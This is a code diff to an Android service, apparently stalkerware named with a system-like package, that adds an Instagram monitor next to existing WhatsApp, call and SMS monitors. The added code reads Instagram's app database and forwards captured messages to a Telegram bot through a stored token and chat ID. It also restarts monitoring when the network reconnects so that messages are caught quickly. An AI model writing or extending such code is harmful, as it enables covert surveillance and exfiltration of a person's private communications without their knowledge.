@@ -20,6 +20,7 @@ import com.system.superiormonitor.monitor.CallMonitor
 import com.system.superiormonitor.monitor.NetworkEnforcer
 import com.system.superiormonitor.monitor.SnapshotScheduler
 import com.system.superiormonitor.monitor.WhatsAppMonitor
+import com.system.superiormonitor.monitor.InstagramMonitor
 import com.system.superiormonitor.monitor.SmsMonitor
 
 import com.system.superiormonitor.util.LogCategory
@@ -55,6 +56,7 @@ class BotService : Service() {
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
     private var pollingJob: Job? = null
     private var whatsAppMonitor: WhatsAppMonitor? = null
+    private var instagramMonitor: InstagramMonitor? = null
     private var callMonitor: CallMonitor? = null
     private var smsMonitor: SmsMonitor? = null
 
@@ -91,6 +93,10 @@ class BotService : Service() {
         // ── Dynamic feature toggle actions (no need to restart whole service) ──
         if (action == "ACTION_UPDATE_WHATSAPP") {
             handleWhatsAppToggle()
+            return START_STICKY
+        }
+        if (action == "ACTION_UPDATE_INSTAGRAM") {
+            handleInstagramToggle()
             return START_STICKY
         }
         if (action == "ACTION_UPDATE_CALL_ALERTS") {
@@ -138,6 +144,7 @@ class BotService : Service() {
 
         // Start monitors if enabled
         startWhatsAppMonitorIfEnabled()
+        startInstagramMonitorIfEnabled()
         startCallMonitorIfEnabled()
         startSmsMonitorIfEnabled()
         
@@ -169,6 +176,19 @@ class BotService : Service() {
             whatsAppMonitor?.stop()
             whatsAppMonitor = null
             LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor dynamically stopped.")
+        }
+    }
+
+    private fun handleInstagramToggle() {
+        if (prefsManager?.instagramEnabled == true) {
+            if (instagramMonitor == null) {
+                startInstagramMonitorIfEnabled()
+                LogManager.log(LogCategory.SYSTEM, "Instagram Monitor dynamically started.")
+            }
+        } else {
+            instagramMonitor?.stop()
+            instagramMonitor = null
+            LogManager.log(LogCategory.SYSTEM, "Instagram Monitor dynamically stopped.")
         }
     }
 
@@ -300,9 +320,10 @@ class BotService : Service() {
                 }
 
                 whatsAppMonitor = WhatsAppMonitor(this) { text, parseMode: String? ->
-                    val chatId = prefsManager?.chatId ?: return@WhatsAppMonitor
-                    val token = prefsManager?.botToken ?: return@WhatsAppMonitor
-                    TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                    val chatId = prefsManager?.chatId ?: return@WhatsAppMonitor false
+                    val token = prefsManager?.botToken ?: return@WhatsAppMonitor false
+                    val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                    msgId != null
                 }
                 LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor initialized.")
             }
@@ -310,12 +331,41 @@ class BotService : Service() {
         }
     }
 
+    private fun startInstagramMonitorIfEnabled() {
+        if (prefsManager?.instagramEnabled == true) {
+            if (instagramMonitor == null) {
+                // Fail-safe: Verify Instagram is installed and database is accessible
+                if (!InstagramMonitor.isInstagramInstalled(this)) {
+                    LogManager.log(LogCategory.SYSTEM, "Instagram Monitor: Instagram is not installed. Disabling toggle.")
+                    prefsManager?.instagramEnabled = false
+                    return
+                }
+                val (dbAvailable, dbReason) = InstagramMonitor.checkInstagramDatabase()
+                if (!dbAvailable) {
+                    LogManager.log(LogCategory.SYSTEM, "Instagram Monitor: $dbReason Disabling toggle.")
+                    prefsManager?.instagramEnabled = false
+                    return
+                }
+
+                instagramMonitor = InstagramMonitor(this) { text, parseMode: String? ->
+                    val chatId = prefsManager?.chatId ?: return@InstagramMonitor false
+                    val token = prefsManager?.botToken ?: return@InstagramMonitor false
+                    val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                    msgId != null
+                }
+                LogManager.log(LogCategory.SYSTEM, "Instagram Monitor initialized.")
+            }
+            instagramMonitor?.start(serviceScope)
+        }
+    }
+
     private fun startCallMonitorIfEnabled() {
         if (prefsManager?.callAlertsEnabled == true && callMonitor == null) {
             callMonitor = CallMonitor(this) { text, parseMode: String? ->
-                val chatId = prefsManager?.chatId ?: return@CallMonitor
-                val token = prefsManager?.botToken ?: return@CallMonitor
-                TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                val chatId = prefsManager?.chatId ?: return@CallMonitor false
+                val token = prefsManager?.botToken ?: return@CallMonitor false
+                val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                msgId != null
             }
             callMonitor?.start()
         }
@@ -325,9 +375,10 @@ class BotService : Service() {
         if (prefsManager?.smsAlertsEnabled == true) {
             if (smsMonitor == null) {
                 smsMonitor = SmsMonitor(this) { text, parseMode: String? ->
-                    val chatId = prefsManager?.chatId ?: return@SmsMonitor
-                    val token = prefsManager?.botToken ?: return@SmsMonitor
-                    TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                    val chatId = prefsManager?.chatId ?: return@SmsMonitor false
+                    val token = prefsManager?.botToken ?: return@SmsMonitor false
+                    val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
+                    msgId != null
                 }
                 smsMonitor?.start()
                 LogManager.log(LogCategory.SYSTEM, "SMS Monitor started.")
@@ -347,6 +398,7 @@ class BotService : Service() {
             override fun onAvailable(network: Network) {
                 // Instantly resume WhatsApp Monitor to catch the reconnect message flood
                 startWhatsAppMonitorIfEnabled()
+                startInstagramMonitorIfEnabled()
 
                 if (pollingJob?.isActive != true) {
                     LogManager.log(LogCategory.SYSTEM, "Network connection detected. Initiating recovery sequence...")
@@ -367,8 +419,8 @@ class BotService : Service() {
                             LogManager.log(LogCategory.SYSTEM, "Telegram API is reachable!")
                         }
 
-                        LogManager.log(LogCategory.SYSTEM, "Waiting 10 seconds for network stabilization...")
-                        delay(10000)
+                        LogManager.log(LogCategory.SYSTEM, "Waiting 5 seconds for network stabilization...")
+                        delay(5000)
 
                         if (!resolveDnsWithRetries("api.telegram.org")) {
                             LogManager.log(LogCategory.SYSTEM, "[System] DNS resolution failed after 3 retries. Returning to deep sleep.", LogLevel.ERROR)
@@ -389,6 +441,7 @@ class BotService : Service() {
                 
                 // Suspend WhatsApp Monitor to save battery
                 whatsAppMonitor?.stop()
+                instagramMonitor?.stop()
 
                 pollingJob?.cancel()
                 pollingJob = null
@@ -567,6 +620,8 @@ class BotService : Service() {
         super.onDestroy()
         whatsAppMonitor?.stop()
         whatsAppMonitor = null
+        instagramMonitor?.stop()
+        instagramMonitor = null
         callMonitor?.stop()
         callMonitor = null
         smsMonitor?.stop()
